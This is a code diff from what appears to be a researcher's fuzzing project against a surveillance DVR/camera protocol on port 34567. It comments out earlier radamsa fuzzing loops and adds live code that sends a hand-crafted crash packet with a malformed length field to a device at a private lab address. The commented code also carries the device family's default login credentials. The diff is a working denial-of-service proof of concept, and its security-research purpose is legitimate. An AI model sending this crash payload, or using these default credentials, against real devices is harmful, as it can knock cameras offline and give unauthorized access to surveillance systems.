@@ -3,18 +3,78 @@ require "socket"
 
 require "./magic_fuzzer"
 
-File.open("./logs/test.log", "w+") do |file|
-  m = MagicFuzzer(Command::SystemInfo).new(
-    magic: (0x0000..0x1000),
-    username: "admin",
-    password: "password",
-    output: file
-    )
-  m.run
-  m.wait_until_done
-  m.report
-  m.close
-end
+# File.open("./logs/test.log", "w+") do |file|
+#   m = MagicFuzzer(Command::SystemInfo).new(
+#     magic: (0x0000..0x1000),
+#     username: "admin",
+#     password: "password",
+#     output: file
+#     )
+#   m.run
+#   m.wait_until_done
+#   m.report
+#   m.close
+# end
+
+# File.open("./rsrc/op_monitor.txt", "w+") do |file|
+#   file.print Command::OPMonitor.new(session_id: 0xabcdef00_u32).to_s
+# end
+
+# File.open("./logs/radamsa/op_monitor.log", "w+") do |file|
+#   puts "Testing connection"
+#   socket = MagicSocket.new("192.168.11.109", 34567)
+#   socket.login "default", Dahua.digest("tluafed")
+#   xmm = Command::OPMonitor.new
+#   socket.send_message xmm
+#   puts "SENT: #{xmm.message}"
+#   reply = socket.receive_message
+#   puts "GOT: #{reply.message}"
+
+#   1000.times do |x|
+#     begin
+#       socket = MagicSocket.new("192.168.11.109", 34567)
+#       socket.login "default", Dahua.digest("tluafed")
+#       message = `radamsa ./rsrc/op_monitor.txt`
+#       file.puts "SENT: #{message.inspect}"
+#       socket.send message
+#       reply = socket.receive_message
+#       file.puts "GOT: #{reply.message.inspect}"
+#     rescue e : MagicError::SocketException
+#       puts "SOCKET DOWN! #{e.inspect}"
+#       raise e
+#     rescue e : MagicError::Exception
+#       file.puts "ERROR: #{e.inspect}"
+#       puts "ERROR: #{e.inspect}"
+#     rescue e
+#       file.puts "BAD ERROR: #{e.inspect}"
+#       puts "BAD ERROR: #{e.inspect}"
+#     end
+#   end
+# end
+
+
+
+
+
+
+
+
+crash_string = "\xFF" + ("\x00"*13) + "\xe8\x03" + "\x00\x00\x00\x80"
+socket = MagicSocket.new("192.168.11.109", 34567)
+socket.send crash_string
+puts "SENT: #{crash_string.inspect}"
+reply = socket.receive_message
+puts "GOT: #{reply.message}"
+
+
+
+
+
+
+
+
+
+
 
 # xmm.magic = 0x03f1 # LOGOUT?
 # xmm.magic = 0x03fc # LOGOUT?
